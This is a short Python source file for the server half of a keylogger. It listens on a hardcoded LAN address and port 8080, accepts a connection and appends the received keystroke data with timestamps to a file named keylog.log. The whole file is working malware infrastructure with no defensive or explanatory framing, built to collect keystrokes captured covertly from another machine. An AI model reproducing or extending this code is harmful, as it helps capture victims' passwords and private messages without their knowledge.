import socket
import threading
from time import localtime

class Server:
    HOST = '192.168.3.217'
    PORT = 8080

    def __init__(self):
        # server_thread = threading.Thread(target=self.receive)
        # server_thread.daemon = True
        # server_thread.start()
        self.receive()

    def receive(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.HOST, self.PORT))
            s.listen()

            conn, addr = s.accept()
            with conn and open("keylog.log", "a") as file:
                print(f'Connected by {addr}')
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break

                    file.write(f"\n{localtime().tm_year}-{localtime().tm_mon}-{localtime().tm_mday}   {localtime().tm_hour}-"f"{localtime().tm_min}-{localtime().tm_sec}: {data.decode()}")

if __name__ == '__main__':
    server = Server()